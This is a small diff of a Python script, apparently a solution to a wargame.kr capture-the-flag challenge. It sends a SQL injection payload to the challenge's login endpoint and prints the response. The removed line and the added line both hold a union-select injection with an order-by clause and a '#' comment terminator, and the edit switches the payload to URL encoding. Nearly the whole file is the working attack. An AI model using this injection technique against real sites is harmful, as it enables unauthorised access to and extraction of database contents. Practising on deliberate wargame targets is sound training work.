@@ -1,5 +1,8 @@
 from requests import *
-url=f'http://wargame.kr:8080/zairo?pw=&flag=abs&id=zairowkdlfhdkel%27 union select 1,2,3,%27%57%0f%27,5 order by 4 asc %23'
+from urllib.parse import *
+query="zairowkdlfhdkel' union select 1,'y',3,4,5 order by 4 desc #"
+query=quote(query)
+url=f"http://wargame.kr:8080/zairo?pw=&flag=abs&id={query}"
 response=get(url=url)
 print(url)
 print(response.text)
